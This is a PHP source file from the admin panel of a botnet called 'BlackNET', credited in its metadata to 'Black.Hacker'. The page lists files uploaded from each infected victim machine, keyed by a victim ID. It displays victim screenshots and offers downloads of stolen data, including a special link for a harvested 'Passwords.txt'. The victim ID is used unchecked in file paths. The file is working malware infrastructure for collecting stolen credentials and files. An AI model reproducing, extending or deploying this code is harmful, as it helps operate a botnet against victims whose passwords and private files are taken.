<?php
include_once 'classes/Database.php';
include_once 'session.php';

if ($user_check != $data->username || $password_check != $data->password){
    $database->redirect("logout.php");
}

$vicID = isset($_GET['vicid']) ? $_GET['vicid'] : '';
$blacklist = array('..', '.',"index.php",".htaccess");

$files = null;

if (file_exists("upload/$vicID")){
  try {
  $files = scandir("upload/$vicID");
} catch (Exception $e) {
  echo $e->getMessage();
}

}

function formatBytes($bytes, $precision = 2) { 
    $units = array('B', 'KB', 'MB', 'GB', 'TB'); 
    $bytes = max($bytes, 0); 
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
    $pow = min($pow, count($units) - 1); 
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow]; 
} 
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
	<title>BlackNET - View Uploads</title>
	<?php include_once 'components/css.php'; ?>
	<link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
    <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
    <style type="text/css">
      .sticky{
        display: -webkit-box;
        display: -ms-flexbox;
        background-color: #e9ecef;
        height: 80px;
        right: 0;
        bottom: 0; 
        position: absolute;
        display: flex;
        width: 100%;
        flex-shrink: none;
      }
    </style>
</head>
<body id="page-top">
	<?php include_once 'components/header.php'; ?>
	<div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Uploads Folder</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-upload"></i>
              View Uploads</div>
              <div class="card-body">
              	<div class="container text-center">

              		<?php if(file_exists("upload/$vicID/" . base64_encode($vicID) . ".png")): ?>
              			<a href="<?php echo("upload/$vicID/" . base64_encode($vicID) . ".png"); ?>"><img class="img-fluid rounded border border-secondary" width="60%" height="60%" src="<?php echo("upload/$vicID/" . base64_encode($vicID) . ".png"); ?>"></a>
              		<?php else: ?>
              			<img class="img-fluid rounded border border-secondary" src="imgs/placeholder.jpg" width="60%" height="60%">
              		<?php endif; ?>

              		<div class="table-responsive pt-4 pb-4">
	              		<table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
		                  <thead>
		                    <tr>
		                      <th>#</th>
		                      <th>File Name</th>
		                      <th>File Size</th>
		                      <th>File Hash</th>
		                      <th>Download</th>
		                    </tr>
		                  </thead>
		                  <tbody>
		                  	<?php $i = 1; ?>
		                  	<?php foreach ($files as $file): ?>
		                  		<?php if (!(in_array($file, $blacklist))): ?>
		                  		<tr>
		                  		<td><?php echo $i; ?></td>

		                  		<td><?php echo $file; ?></td>

		                  		<td><?php echo formatBytes(filesize("upload/$vicID/$file")); ?></td>

		                  		<td><?php echo md5_file("upload/$vicID/$file"); ?></td>

		                  		<?php if($file == "Passwords.txt"): ?>
		                  			<td><a href="<?php echo("viewpasswords.php?vicid=$vicID") ?>">Download</a></td>
		                  		<?php else: ?>
		                  			<td><a href="<?php echo("upload/$vicID/$file") ?>">Download</a></td>
		                  		<?php endif; ?>
		                  	</tr>
		                      <?php $i++; ?>
		                  	<?php endif; ?>
		                  	<?php endforeach; ?>
		                  </tbody>
	              		</table>
              		</div>
              	</div>
           	 </div>
         </div>
      </div>
 	 </div>
	</div>
	<?php include_once 'components/footer.php'; ?>

	<?php include_once 'components/js.php'; ?>

    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/vendor/responsive/dataTables.responsive.js"></script>
    <script src="asset/vendor/responsive/responsive.bootstrap4.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
</body>
</html>
